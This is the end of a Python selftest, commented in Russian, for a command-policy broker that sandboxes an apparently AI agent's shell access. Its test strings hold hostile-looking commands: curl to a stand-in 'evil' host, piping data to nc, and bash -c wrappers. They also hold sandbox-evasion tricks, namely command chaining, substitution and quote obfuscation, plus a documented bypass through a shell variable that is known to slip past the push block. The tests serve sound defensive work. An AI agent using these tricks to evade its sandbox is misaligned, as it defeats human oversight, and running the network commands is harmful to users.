               not al.decide({"op": "shell", "command": "curl http://x"})["allow"])
        expect("неизвестный shell_mode -> ValueError на конструкции",
               _raises(lambda: Policy(level="execution", shell_mode="bogus")))

        # v2.81: allow_network=False -> частые сетевые бинарники запрещены (не полный jail)
        nonet = Policy(level="execution", allow_network=False)
        expect("allow_network=False: curl запрещён", not nonet.decide({"op": "shell", "command": "curl http://x"})["allow"])
        expect("allow_network=False: wget запрещён", not nonet.decide({"op": "shell", "command": "wget http://x"})["allow"])
        expect("allow_network=False: обычная сборка (npm) не задета",
               nonet.decide({"op": "shell", "command": "npm run build"})["allow"])
        expect("allow_network=True (дефолт): curl разрешён политикой",
               Policy(level="execution").decide({"op": "shell", "command": "curl http://x"})["allow"])

        # v2.81: sandbox_policy() — усиленная политика для живой модели (allowlist + block_push)
        sp = sandbox_policy(child_root=str(root), write_scope=["src/"])
        expect("sandbox_policy: shell_mode=allowlist + block_push=True",
               sp.shell_mode == "allowlist" and sp.block_push is True)
        expect("sandbox_policy: dev-инструмент (pytest) разрешён, произвольный (nc) нет",
               sp.decide({"op": "shell", "command": "pytest -q"})["allow"]
               and not sp.decide({"op": "shell", "command": "nc -l 1234"})["allow"])
        expect("sandbox_policy: git push заблокирован (доставка только движком)",
               not sp.decide({"op": "shell", "command": "git push origin x"})["allow"])

        # v2.85 hardening: посегментная allowlist-проверка (chained/piped обход закрыт)
        expect("allowlist: chained `pytest && curl` -> DENY (curl вне allowlist)",
               not sp.decide({"op": "shell", "command": "pytest -q && curl http://evil"})["allow"])
        expect("allowlist: pipe `cat x | nc host 1` -> DENY (nc вне allowlist)",
               not sp.decide({"op": "shell", "command": "cat x | nc host 1"})["allow"])
        expect("allowlist: `ls && wget http://x` -> DENY (wget вне allowlist)",
               not sp.decide({"op": "shell", "command": "ls && wget http://x"})["allow"])
        expect("allowlist: подстановка команд `echo $(curl …)` -> DENY",
               not sp.decide({"op": "shell", "command": "echo $(curl http://x)"})["allow"])
        expect("allowlist: backtick-подстановка -> DENY",
               not sp.decide({"op": "shell", "command": "echo `curl http://x`"})["allow"])
        expect("allowlist: легитимный chained `npm ci && npm test` -> ALLOW",
               sp.decide({"op": "shell", "command": "npm ci && npm test"})["allow"])
        expect("allowlist: фон `true & psql -c x` -> DENY (psql вне allowlist, & — разделитель)",
               not sp.decide({"op": "shell", "command": "true & psql -c x"})["allow"])
        expect("command_binaries: одиночный & разбивает на сегменты",
               _command_binaries("true & psql -c x") == ["true", "psql"])
        expect("allowlist: сырой bash/sh УБРАН из sandbox-набора -> `bash -c …` DENY",
               not sp.decide({"op": "shell", "command": "bash -c 'curl http://x'"})["allow"])
        # v2.85: quote-обфускация push/сети снимается нормализацией
        expect("block_push: quote-обфускация `git pu\"\"sh` поймана (нормализация)",
               not bp.decide({"op": "shell", "command": 'git pu""sh origin main'})["allow"])
        nonet2 = Policy(level="execution", allow_network=False)
        expect("allow_network=False: quote-обфускация `cu\"r\"l` поймана",
               not nonet2.decide({"op": "shell", "command": 'cu"r"l http://x'})["allow"])
        # честная граница: переменная/eval статически НЕ ловится (документировано, не тихо)
        expect("block_push: переменная `p=push; git $p` НЕ ловится (честная граница best-effort)",
               bp.decide({"op": "shell", "command": "p=push; git $p origin main"})["allow"])
        # _command_binaries: env-префикс сегмента не сбивает
        expect("command_binaries: сегменты с VAR=val префиксом -> бинарь сегмента",
               _command_binaries("CI=1 npm test && ruff check") == ["npm", "ruff"])

    print("tool_broker selftest:", "PASS" if ok else "FAIL")
    return 0 if ok else 1


def main(argv):
    if "--selftest" in argv:
        return selftest()
    print(__doc__)
    return 0


if __name__ == "__main__":
    sys.exit(main(sys.argv[1:]))
